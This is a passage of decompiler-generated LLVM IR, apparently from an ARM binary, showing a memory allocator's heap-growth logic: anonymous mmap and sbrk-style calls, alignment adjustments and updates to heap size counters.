  %v2_12210 = icmp eq i32 %v1_12210, 0
  %v1_12214 = add i32 %v4_121c8, 860
  %v2_12214 = inttoptr i32 %v1_12214 to i32*
  %v3_12214 = load i32, i32* %v2_12214, align 4
  store i32 %v3_12214, i32* %r1.global-to-local, align 4
  br i1 %v2_12210, label %dec_label_pc_1222c, label %dec_label_pc_1221c

dec_label_pc_1221c:                               ; preds = %dec_label_pc_1220c
  %v0_1221c = call i32 @function_12bec()
  %v0_12220 = load i32, i32* @sl, align 4
  %v1_12220 = add i32 %v0_12220, -7
  store i32 %v1_12220, i32* @r0, align 4
  %v0_12224 = call i32 @function_11d34()
  store i32 %v0_12224, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12608

dec_label_pc_1222c:                               ; preds = %dec_label_pc_1220c
  %v1_1222c = add i32 %v4_121c8, 844
  %v2_1222c = inttoptr i32 %v1_1222c to i32*
  %v3_1222c = load i32, i32* %v2_1222c, align 4
  store i32 %v3_1222c, i32* %r3.global-to-local, align 4
  %v3_12230 = icmp ult i32 %v0_121d4, %v3_1222c
  %v1_12234 = add i32 %v3_12214, -1
  store i32 %v1_12234, i32* %sb.global-to-local, align 4
  br i1 %v3_12230, label %dec_label_pc_12308, label %dec_label_pc_1223c

dec_label_pc_1223c:                               ; preds = %dec_label_pc_1222c
  %v1_1223c = add i32 %v4_121c8, 852
  %v2_1223c = inttoptr i32 %v1_1223c to i32*
  %v3_1223c = load i32, i32* %v2_1223c, align 4
  store i32 %v3_1223c, i32* %r2.global-to-local, align 4
  %v1_12240 = add i32 %v4_121c8, 848
  %v2_12240 = inttoptr i32 %v1_12240 to i32*
  %v3_12240 = load i32, i32* %v2_12240, align 4
  store i32 %v3_12240, i32* %r3.global-to-local, align 4
  %v6_12248 = icmp slt i32 %v3_12240, %v3_1223c
  br i1 %v6_12248, label %dec_label_pc_1224c, label %dec_label_pc_12308

dec_label_pc_1224c:                               ; preds = %dec_label_pc_1223c
  %v1_1224c = add i32 %v0_121d4, 10
  %v2_12250 = add i32 %v1_1224c, %v3_12214
  store i32 %v2_12250, i32* %r3.global-to-local, align 4
  %v2_12254 = sub i32 0, %v3_12214
  %v3_12254 = and i32 %v2_12250, %v2_12254
  store i32 %v3_12254, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_12254, %v0_121d4
  br i1 %tmp211, label %dec_label_pc_12260, label %dec_label_pc_12308

dec_label_pc_12260:                               ; preds = %dec_label_pc_1224c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12254, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12278 = call i32 @function_1401c(i32 0, i32 %v3_12254, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12278, i32* %r0.global-to-local, align 4
  %v7_1227c = icmp eq i32 %v6_12278, -1
  br i1 %v7_1227c, label %dec_label_pc_12260.dec_label_pc_12308_crit_edge, label %dec_label_pc_12284

dec_label_pc_12260.dec_label_pc_12308_crit_edge:  ; preds = %dec_label_pc_12260
  %v1_1232c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12308

dec_label_pc_12284:                               ; preds = %dec_label_pc_12260
  %v1_12284 = urem i32 %v6_12278, 8
  store i32 %v1_12284, i32* %r2.global-to-local, align 4
  %v2_12284 = icmp eq i32 %v1_12284, 0
  br i1 %v2_12284, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_12284
  %v2_12288 = sub nsw i32 8, %v1_12284
  store i32 %v2_12288, i32* %r3.global-to-local, align 4
  %v2_1228c = load i32, i32* @r4, align 4
  %v3_1228c = sub i32 %v2_1228c, %v2_12288
  %v3_12290 = add i32 %v2_12288, %v6_12278
  store i32 %v3_12290, i32* %lr.global-to-local, align 4
  %v2_12298 = or i32 %v3_1228c, 2
  store i32 %v2_12298, i32* %r2.global-to-local, align 4
  %v5_122a0 = inttoptr i32 %v3_12290 to i32*
  store i32 %v2_12288, i32* %v5_122a0, align 4
  %v1_122a4 = load i32, i32* %r2.global-to-local, align 4
  %v2_122a4 = load i32, i32* %lr.global-to-local, align 4
  %v3_122a4 = add i32 %v2_122a4, 4
  %v4_122a4 = inttoptr i32 %v3_122a4 to i32*
  store i32 %v1_122a4, i32* %v4_122a4, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_12284
  store i32 %v6_12278, i32* %lr.global-to-local, align 4
  %v1_1229c47 = load i32, i32* @r4, align 4
  %v2_1229c48 = or i32 %v1_1229c47, 2
  store i32 %v2_1229c48, i32* %r3.global-to-local, align 4
  %v3_122a8 = inttoptr i32 %v6_12278 to i32*
  store i32 0, i32* %v3_122a8, align 4
  %v1_122ac = load i32, i32* %r3.global-to-local, align 4
  %v2_122ac = load i32, i32* %lr.global-to-local, align 4
  %v3_122ac = add i32 %v2_122ac, 4
  %v4_122ac = inttoptr i32 %v3_122ac to i32*
  store i32 %v1_122ac, i32* %v4_122ac, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 126992, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_122b8 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_122b8, i32* %ip.global-to-local, align 4
  %v1_122bc = add i32 %v4_122b8, 848
  %v2_122bc = inttoptr i32 %v1_122bc to i32*
  %v3_122bc = load i32, i32* %v2_122bc, align 4
  store i32 %v3_122bc, i32* %r3.global-to-local, align 4
  %v1_122c0 = add i32 %v4_122b8, 856
  %v2_122c0 = inttoptr i32 %v1_122c0 to i32*
  %v3_122c0 = load i32, i32* %v2_122c0, align 4
  store i32 %v3_122c0, i32* %r2.global-to-local, align 4
  %v1_122c4 = add i32 %v3_122bc, 1
  store i32 %v1_122c4, i32* %r3.global-to-local, align 4
  %v7_122cc = icmp sgt i32 %v1_122c4, %v3_122c0
  br i1 %v7_122cc, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_122c4, i32* %v2_122c0, align 4
  %v0_122d0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_122d0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_122d0 = phi i32 [ %v4_122b8, %.thread27 ], [ %v1_122d0.pre, %bb147 ]
  %v0_122d0 = phi i32 [ %v1_122c4, %.thread27 ], [ %v0_122d0.pre, %bb147 ]
  %v2_122d0 = add i32 %v1_122d0, 848
  %v3_122d0 = inttoptr i32 %v2_122d0 to i32*
  store i32 %v0_122d0, i32* %v3_122d0, align 4
  %v0_122d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_122d4 = add i32 %v0_122d4, 868
  %v2_122d4 = inttoptr i32 %v1_122d4 to i32*
  %v3_122d4 = load i32, i32* %v2_122d4, align 4
  store i32 %v3_122d4, i32* %r3.global-to-local, align 4
  %v1_122d8 = add i32 %v0_122d4, 880
  %v2_122d8 = inttoptr i32 %v1_122d8 to i32*
  %v3_122d8 = load i32, i32* %v2_122d8, align 4
  store i32 %v3_122d8, i32* %r2.global-to-local, align 4
  %v0_122dc = load i32, i32* @r4, align 4
  %v2_122dc = add i32 %v0_122dc, %v3_122d4
  store i32 %v2_122dc, i32* %r1.global-to-local, align 4
  %v1_122e0 = add i32 %v0_122d4, 872
  %v2_122e0 = inttoptr i32 %v1_122e0 to i32*
  %v3_122e0 = load i32, i32* %v2_122e0, align 4
  store i32 %v3_122e0, i32* %r3.global-to-local, align 4
  %v1_122e8 = add i32 %v0_122d4, 884
  %v2_122e8 = inttoptr i32 %v1_122e8 to i32*
  %v3_122e8 = load i32, i32* %v2_122e8, align 4
  store i32 %v3_122e8, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_122dc, %v3_122d8
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_122dc, i32* %v2_122d8, align 4
  %v0_122f0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_122f0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_122f0 = phi i32 [ %v0_122d4, %bb148 ], [ %v1_122f0.pre, %bb149 ]
  %v0_122f0 = phi i32 [ %v2_122dc, %bb148 ], [ %v0_122f0.pre, %bb149 ]
  %v2_122f0 = add i32 %v1_122f0, 868
  %v3_122f0 = inttoptr i32 %v2_122f0 to i32*
  store i32 %v0_122f0, i32* %v3_122f0, align 4
  %v0_122f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_122f4 = load i32, i32* %r3.global-to-local, align 4
  %v2_122f4 = add i32 %v1_122f4, %v0_122f4
  store i32 %v2_122f4, i32* %r1.global-to-local, align 4
  %v1_122f8 = load i32, i32* %r2.global-to-local, align 4
  %v0_122fc = load i32, i32* %lr.global-to-local, align 4
  %v1_122fc = add i32 %v0_122fc, 8
  store i32 %v1_122fc, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_122f4, %v1_122f8
  br i1 %tmp213, label %bb151, label %dec_label_pc_12608

bb151:                                            ; preds = %bb150
  %v5_12300 = load i32, i32* %ip.global-to-local, align 4
  %v6_12300 = add i32 %v5_12300, 884
  %v7_12300 = inttoptr i32 %v6_12300 to i32*
  store i32 %v2_122f4, i32* %v7_12300, align 4
  br label %dec_label_pc_12608

dec_label_pc_12308:                               ; preds = %dec_label_pc_1224c, %dec_label_pc_1222c, %dec_label_pc_12260.dec_label_pc_12308_crit_edge, %dec_label_pc_1223c
  %v1_1232c = phi i32 [ %v1_1232c.pre, %dec_label_pc_12260.dec_label_pc_12308_crit_edge ], [ %v0_121d4, %dec_label_pc_1223c ], [ %v0_121d4, %dec_label_pc_1222c ], [ %v0_121d4, %dec_label_pc_1224c ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v4_12310 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12310, i32* %r3.global-to-local, align 4
  %v1_12314 = add i32 %v4_12310, 44
  %v2_12314 = inttoptr i32 %v1_12314 to i32*
  %v3_12314 = load i32, i32* %v2_12314, align 4
  store i32 %v3_12314, i32* %r0.global-to-local, align 4
  %v1_12318 = add i32 %v4_12310, 864
  %v2_12318 = inttoptr i32 %v1_12318 to i32*
  %v3_12318 = load i32, i32* %v2_12318, align 4
  store i32 %v3_12318, i32* %r2.global-to-local, align 4
  %v1_1231c = add i32 %v4_12310, 840
  %v2_1231c = inttoptr i32 %v1_1231c to i32*
  %v3_1231c = load i32, i32* %v2_1231c, align 4
  store i32 %v3_1231c, i32* %r3.global-to-local, align 4
  %v1_12320 = add i32 %v3_12314, 4
  %v2_12320 = inttoptr i32 %v1_12320 to i32*
  %v3_12320 = load i32, i32* %v2_12320, align 4
  store i32 %v3_12320, i32* %r1.global-to-local, align 4
  %v1_12328 = urem i32 %v3_12318, 2
  %v2_12328 = icmp eq i32 %v1_12328, 0
  %v1_12324 = add i32 %v1_1232c, 16
  %v2_1232c = add i32 %v1_12324, %v3_1231c
  store i32 %v2_1232c, i32* %r3.global-to-local, align 4
  %v1_12330 = and i32 %v3_12320, -4
  store i32 %v1_12330, i32* @r8, align 4
  br i1 %v2_12328, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_12308
  %v3_12334 = sub i32 %v2_1232c, %v1_12330
  store i32 %v3_12334, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_12308, %bb152
  %v0_12338 = phi i32 [ %v2_1232c, %dec_label_pc_12308 ], [ %v3_12334, %bb152 ]
  %v1_12338 = load i32, i32* %sb.global-to-local, align 4
  %v2_12338 = add i32 %v1_12338, %v0_12338
  store i32 %v2_12338, i32* %r3.global-to-local, align 4
  %v1_1233c = sub i32 -1, %v1_12338
  store i32 %v1_1233c, i32* %fp.global-to-local, align 4
  %v2_12340 = and i32 %v2_12338, %v1_1233c
  store i32 %v2_12340, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_12340, 1
  br i1 %tmp154, label %dec_label_pc_12364, label %dec_label_pc_12350

dec_label_pc_12350:                               ; preds = %bb153
  store i32 %v2_12340, i32* %r0.global-to-local, align 4
  %v1_12354 = call i32 @function_142a8(i32 %v2_12340)
  store i32 %v1_12354, i32* %r0.global-to-local, align 4
  %v3_12358 = icmp eq i32 %v1_12354, -1
  store i32 %v1_12354, i32* @r4, align 4
  br i1 %v3_12358, label %dec_label_pc_12364, label %dec_label_pc_123d0

dec_label_pc_12364:                               ; preds = %dec_label_pc_12350, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  %v4_1236c = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_1236c, i32* %r6.global-to-local, align 4
  %v1_12370 = add i32 %v4_1236c, 864
  %v2_12370 = inttoptr i32 %v1_12370 to i32*
  %v3_12370 = load i32, i32* %v2_12370, align 4
  store i32 %v3_12370, i32* %r3.global-to-local, align 4
  %v1_12374 = urem i32 %v3_12370, 2
  %v2_12374 = icmp eq i32 %v1_12374, 0
  br i1 %v2_12374, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_12364
  %v1_12378 = load i32, i32* @r8, align 4
  %v2_12378 = load i32, i32* %sb.global-to-local, align 4
  %v3_12378 = add i32 %v2_12378, %v1_12378
  %v2_1237c = load i32, i32* @r5, align 4
  %v3_1237c = add i32 %v3_12378, %v2_1237c
  store i32 %v3_1237c, i32* %r3.global-to-local, align 4
  %v2_12380 = load i32, i32* %fp.global-to-local, align 4
  %v3_12380 = and i32 %v2_12380, %v3_1237c
  store i32 %v3_12380, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_12364
  %v0_12384.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_12384 = phi i32 [ %v0_12384.pr, %.thread29thread-pre-split ], [ %v3_12380, %bb155 ]
  %v2_12384 = icmp ugt i32 %v0_12384, 1048575
  br i1 %v2_12384, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_1239c = phi i32 [ %v0_12384, %.thread29 ], [ 1048576, %bb156 ]
  %v1_1238c = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_1239c, %v1_1238c
  br i1 %tmp214, label %dec_label_pc_12394, label %dec_label_pc_125f8

dec_label_pc_12394:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1239c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_123b0 = call i32 @function_1401c(i32 0, i32 %v0_1239c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_123b0, i32* %r0.global-to-local, align 4
  %v3_123b4 = icmp eq i32 %v6_123b0, -1
  %v8_123b4 = icmp eq i32 %v6_123b0, -1
  store i32 %v6_123b0, i32* @r4, align 4
  br i1 %v8_123b4, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_12394
  %v1_123bc = load i32, i32* %r6.global-to-local, align 4
  %v2_123bc = add i32 %v1_123bc, 864
  %v3_123bc = inttoptr i32 %v2_123bc to i32*
  %v4_123bc = load i32, i32* %v3_123bc, align 4
  %v2_123c0 = load i32, i32* @r5, align 4
  %v3_123c0 = add i32 %v2_123c0, %v6_123b0
  store i32 %v3_123c0, i32* %r0.global-to-local, align 4
  %v2_123c4 = and i32 %v4_123bc, -2
  store i32 %v2_123c4, i32* %r3.global-to-local, align 4
  store i32 %v2_123c4, i32* %v3_123bc, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_12394, %bb158
  br i1 %v3_123b4, label %dec_label_pc_123d0, label %dec_label_pc_123d4

dec_label_pc_123d0:                               ; preds = %.thread32, %dec_label_pc_12350
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123d4

dec_label_pc_123d4:                               ; preds = %.thread32, %dec_label_pc_123d0
  %v0_123d4 = load i32, i32* @r4, align 4
  %v7_123d4 = icmp eq i32 %v0_123d4, -1
  br i1 %v7_123d4, label %dec_label_pc_125f8, label %dec_label_pc_123dc

dec_label_pc_123dc:                               ; preds = %dec_label_pc_123d4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r2.global-to-local, align 4
  %v4_123e4 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_123e4, i32* %ip.global-to-local, align 4
  store i32 %v3_12314, i32* %r2.global-to-local, align 4
  %v1_123ec = add i32 %v4_123e4, 872
  %v2_123ec = inttoptr i32 %v1_123ec to i32*
  %v3_123ec = load i32, i32* %v2_123ec, align 4
  %v1_123f0 = load i32, i32* @r8, align 4
  %v2_123f0 = add i32 %v1_123f0, %v3_12314
  store i32 %v2_123f0, i32* %r1.global-to-local, align 4
  %v0_123f4 = load i32, i32* @r5, align 4
  %v2_123f4 = add i32 %v0_123f4, %v3_123ec
  store i32 %v2_123f4, i32* %r3.global-to-local, align 4
  %v9_123f8 = icmp eq i32 %v0_123d4, %v2_123f0
  br i1 %v9_123f8, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_123dc
  store i32 %v2_123f4, i32* %v2_123ec, align 4
  br label %dec_label_pc_12414

bb159:                                            ; preds = %dec_label_pc_123dc
  %v1_123fc = load i32, i32* %r0.global-to-local, align 4
  %v8_123fc = icmp eq i32 %v1_123fc, -1
  store i32 %v2_123f4, i32* %v2_123ec, align 4
  br i1 %v8_123fc, label %.thread34, label %dec_label_pc_12414

.thread34:                                        ; preds = %bb159
  %v1_12404 = load i32, i32* @r5, align 4
  %v2_12404 = load i32, i32* @r8, align 4
  %v3_12404 = add i32 %v2_12404, %v1_12404
  %v2_12408 = or i32 %v3_12404, 1
  store i32 %v2_12408, i32* %r3.global-to-local, align 4
  %v2_1240c = load i32, i32* %r2.global-to-local, align 4
  %v3_1240c = add i32 %v2_1240c, 4
  %v4_1240c = inttoptr i32 %v3_1240c to i32*
  store i32 %v2_12408, i32* %v4_1240c, align 4
  br label %dec_label_pc_1258c

dec_label_pc_12414:                               ; preds = %bb159, %.thread122
  %v0_12418.pr = load i32, i32* @r8, align 4
  %v0_12414 = load i32, i32* %ip.global-to-local, align 4
  %v1_12414 = add i32 %v0_12414, 864
  %v2_12414 = inttoptr i32 %v1_12414 to i32*
  %v3_12414 = load i32, i32* %v2_12414, align 4
  store i32 %v3_12414, i32* %r2.global-to-local, align 4
  %v2_12418 = icmp eq i32 %v0_12418.pr, 0
  br i1 %v2_12418, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_12414
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_12414
  %v2_12420 = urem i32 %v3_12414, 2
  store i32 %v2_12420, i32* %r3.global-to-local, align 4
  %v2_12424 = icmp eq i32 %v2_12420, 0
  br i1 %v2_12424, label %.thread40, label %dec_label_pc_1242c

dec_label_pc_1242c:                               ; preds = %.thread36
  %v0_1242c = load i32, i32* @r4, align 4
  %v1_1242c = load i32, i32* %r1.global-to-local, align 4
  %v3_1242c = icmp ult i32 %v0_1242c, %v1_1242c
  br i1 %v3_1242c, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_1242c
  %v2_12430 = and i32 %v3_12414, -2
  store i32 %v2_12430, i32* %r3.global-to-local, align 4
  store i32 %v2_12430, i32* %v2_12414, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_1242c, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %ip.global-to-local, align 4
  %v4_12440 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12440, i32* @r7, align 4
  %v1_12444 = add i32 %v4_12440, 864
  %v2_12444 = inttoptr i32 %v1_12444 to i32*
  %v3_12444 = load i32, i32* %v2_12444, align 4
  store i32 %v3_12444, i32* %r3.global-to-local, align 4
  %v1_12448 = urem i32 %v3_12444, 2
  store i32 %v1_12448, i32* @r6, align 4
  %v2_12448 = icmp eq i32 %v1_12448, 0
  br i1 %v2_12448, label %dec_label_pc_124dc, label %dec_label_pc_12450

dec_label_pc_12450:                               ; preds = %.thread40
  %v0_12450 = load i32, i32* @r8, align 4
  %v2_12450 = icmp eq i32 %v0_12450, 0
  br i1 %v2_12450, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_12450
  %v2_12454 = add i32 %v4_12440, 872
  %v3_12454 = inttoptr i32 %v2_12454 to i32*
  %v4_12454 = load i32, i32* %v3_12454, align 4
  store i32 %v4_12454, i32* %r2.global-to-local, align 4
  %v1_12458 = load i32, i32* %r1.global-to-local, align 4
  %v2_12458 = load i32, i32* @r4, align 4
  %v3_12458 = sub i32 %v2_12458, %v1_12458
  %v3_1245c = add i32 %v3_12458, %v4_12454
  store i32 %v3_1245c, i32* %r3.global-to-local, align 4
  store i32 %v3_1245c, i32* %v3_12454, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12450, %bb161
  %v0_12464 = load i32, i32* @r4, align 4
  %v1_12464 = urem i32 %v0_12464, 8
  store i32 %v1_12464, i32* %r3.global-to-local, align 4
  %v2_12464 = icmp eq i32 %v1_12464, 0
  br i1 %v2_12464, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_12468 = sub nsw i32 8, %v1_12464
  store i32 %v2_12468, i32* %r3.global-to-local, align 4
  %v3_1246c = add i32 %v2_12468, %v0_12464
  store i32 %v3_1246c, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_12474 = phi i32 [ 0, %.thread43 ], [ %v2_12468, %bb162 ]
  %v1_12470 = load i32, i32* @r5, align 4
  %v2_12470 = add i32 %v1_12470, %v0_12464
  store i32 %v2_12470, i32* @r6, align 4
  %v1_12474 = load i32, i32* @r8, align 4
  %v2_12474 = add i32 %v2_12470, %v0_12474
  %v2_12478 = add i32 %v2_12474, %v1_12474
  store i32 %v2_12478, i32* %r1.global-to-local, align 4
  %v1_1247c = load i32, i32* %sb.global-to-local, align 4
  %v2_1247c = add i32 %v1_1247c, %v2_12478
  %v1_12480 = load i32, i32* %fp.global-to-local, align 4
  %v2_12480 = and i32 %v1_12480, %v2_1247c
  store i32 %v2_12480, i32* %r2.global-to-local, align 4
  %v2_12484 = sub i32 0, %v2_12470
  store i32 %v2_12484, i32* %r3.global-to-local, align 4
  %v2_12488 = sub i32 %v2_12480, %v2_12470
  store i32 %v2_12488, i32* @r5, align 4
  store i32 %v2_12488, i32* %r0.global-to-local, align 4
  br i1 %v2_12464, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_12464, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_12494 = call i32 @function_142a8(i32 %v2_12488)
  store i32 %v1_12494, i32* %r0.global-to-local, align 4
  %v3_12498 = icmp eq i32 %v1_12494, -1
  br i1 %v3_12498, label %dec_label_pc_124a0, label %dec_label_pc_124b0

dec_label_pc_124a0:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_124a4 = call i32 @function_142a8(i32 0)
  store i32 %v1_124a4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12508

dec_label_pc_124b0:                               ; preds = %bb164
  %v1_124b0 = load i32, i32* @r4, align 4
  %v3_124b0 = icmp ult i32 %v1_12494, %v1_124b0
  br i1 %v3_124b0, label %dec_label_pc_124b8, label %dec_label_pc_12508

dec_label_pc_124b8:                               ; preds = %dec_label_pc_124b0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 126992, i32* %r0.global-to-local, align 4
  %v4_124c0 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_124c0, i32* %r2.global-to-local, align 4
  %v1_124c4 = add i32 %v4_124c0, 864
  %v2_124c4 = inttoptr i32 %v1_124c4 to i32*
  %v3_124c4 = load i32, i32* %v2_124c4, align 4
  %v0_124c8 = load i32, i32* @r6, align 4
  store i32 %v0_124c8, i32* %r0.global-to-local, align 4
  %v1_124cc = and i32 %v3_124c4, -2
  store i32 %v1_124cc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_124cc, i32* %v2_124c4, align 4
  br label %dec_label_pc_12508

dec_label_pc_124dc:                               ; preds = %.thread40
  %v0_124dc = load i32, i32* %r0.global-to-local, align 4
  %v3_124dc = icmp eq i32 %v0_124dc, -1
  br i1 %v3_124dc, label %dec_label_pc_124e4, label %dec_label_pc_12500

dec_label_pc_124e4:                               ; preds = %dec_label_pc_124dc
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_124e8 = call i32 @function_142a8(i32 0)
  store i32 %v1_124e8, i32* %r0.global-to-local, align 4
  %v0_124ec = load i32, i32* @r7, align 4
  %v1_124ec = add i32 %v0_124ec, 872
  %v2_124ec = inttoptr i32 %v1_124ec to i32*
  %v3_124ec = load i32, i32* %v2_124ec, align 4
  store i32 %v3_124ec, i32* %r2.global-to-local, align 4
  %v0_124f0 = load i32, i32* @r4, align 4
  %v0_124f4 = load i32, i32* @r5, align 4
  %v2_124f0 = add i32 %v3_124ec, %v1_124e8
  %v2_124f4 = sub i32 %v2_124f0, %v0_124f0
  %v2_124f8 = sub i32 %v2_124f4, %v0_124f4
  store i32 %v2_124f8, i32* %r3.global-to-local, align 4
  store i32 %v2_124f8, i32* %v2_124ec, align 4
  %v0_12504.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_124dc, %dec_label_pc_124e4
  %v0_12504 = phi i32 [ 0, %dec_label_pc_124dc ], [ %v0_12504.pre, %dec_label_pc_124e4 ]
  %v0_12500 = load i32, i32* @r4, align 4
  store i32 %v0_12500, i32* @r7, align 4
  store i32 %v0_12504, i32* @r5, align 4
  br label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_124b0, %dec_label_pc_124b8, %dec_label_pc_124a0, %dec_label_pc_12500
  %v0_12508 = load i32, i32* %r0.global-to-local, align 4
  %v7_12508 = icmp eq i32 %v0_12508, -1
  br i1 %v7_12508, label %dec_label_pc_1258c, label %dec_label_pc_12510

dec_label_pc_12510:                               ; preds = %dec_label_pc_12508
  %v1_12510 = load i32, i32* @r5, align 4
  %v2_12510 = add i32 %v1_12510, %v0_12508
  %v0_12514 = load i32, i32* @r7, align 4
  %v2_12514 = sub i32 %v2_12510, %v0_12514
  %v1_12518 = or i32 %v2_12514, 1
  %v2_1251c = add i32 %v0_12514, 4
  %v3_1251c = inttoptr i32 %v2_1251c to i32*
  store i32 %v1_12518, i32* %v3_1251c, align 4
  store i32 126992, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12528 = load i32, i32* inttoptr (i32 127024 to i32*), align 16
  store i32 %v4_12528, i32* @r6, align 4
  %v1_1252c = add i32 %v4_12528, 872
  %v2_1252c = inttoptr i32 %v1_1252c to i32*
  %v3_1252c = load i32, i32* %v2_1252c, align 4
  %v0_12530 = load i32, i32* @r8, align 4
  %v2_12530 = icmp eq i32 %v0_12530, 0
  %v0_12534 = load i32, i32* @r5, align 4
  %v2_12534 = add i32 %v0_12534, %v3_1252c
  store i32 %v2_12534, i32* %r3.global-to-local, align 4
  store i32 %v2_12534, i32* %v2_1252c, align 4
  %v0_1253c = load i32, i32* @r7, align 4
  %v1_1253c = load i32, i32* @r6, align 4
  %v2_1253c = add i32 %v1_1253c, 44
  %v3_1253c = inttoptr i32 %v2_1253c to i32*
  store i32 %v0_1253c, i32* %v3_1253c, align 4
  br i1 %v2_12530, label %dec_label_pc_1258c, label %dec_label_pc_12544

dec_label_pc_12544:                               ; preds = %dec_label_pc_12510
  %v0_12548 = load i32, i32* @r8, align 4
  %v1_12548 = add i32 %v0_12548, -12
  %v1_1254c = and i32 %v1_12548, -8
  store i32 %v3_12314, i32* %ip.global-to-local, align 4
  %v2_12554 = add i32 %v1_1254c, %v3_12314
  store i32 %v2_12554, i32* %r1.global-to-local, align 4
  %v2_12558 = icmp ugt i32 %v1_1254c, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12560 = or i32 %v1_1254c, 1
  store i32 %v1_12560, i32* %r3.global-to-local, align 4
  store i32 %v1_12560, i32* %v2_12320, align 4
  %v0_12568 = load i32, i32* %r2.global-to-local, align 4
  %v1_12568 = load i32, i32* %r1.global-to-local, align 4
  %v2_12568 = add i32 %v1_12568, 8
  %v3_12568 = inttoptr i32 %v2_12568 to i32*
  store i32 %v0_12568, i32* %v3_12568, align 4
  %v0_1256c = load i32, i32* %r2.global-to-local, align 4
  %v1_1256c = load i32, i32* %r1.global-to-local, align 4
  %v2_1256c = add i32 %v1_1256c, 4
  %v3_1256c = inttoptr i32 %v2_1256c to i32*
  store i32 %v0_1256c, i32* %v3_1256c, align 4
  br i1 %v2_12558, label %dec_label_pc_12574, label %dec_label_pc_1258c

dec_label_pc_12574:                               ; preds = %dec_label_pc_12544
  %v0_12574 = load i32, i32* @r6, align 4
  %v1_12574 = add i32 %v0_12574, 836
  %v2_12574 = inttoptr i32 %v1_12574 to i32*
  %v3_12574 = load i32, i32* %v2_12574, align 4
  store i32 %v3_12574, i32* @r4, align 4
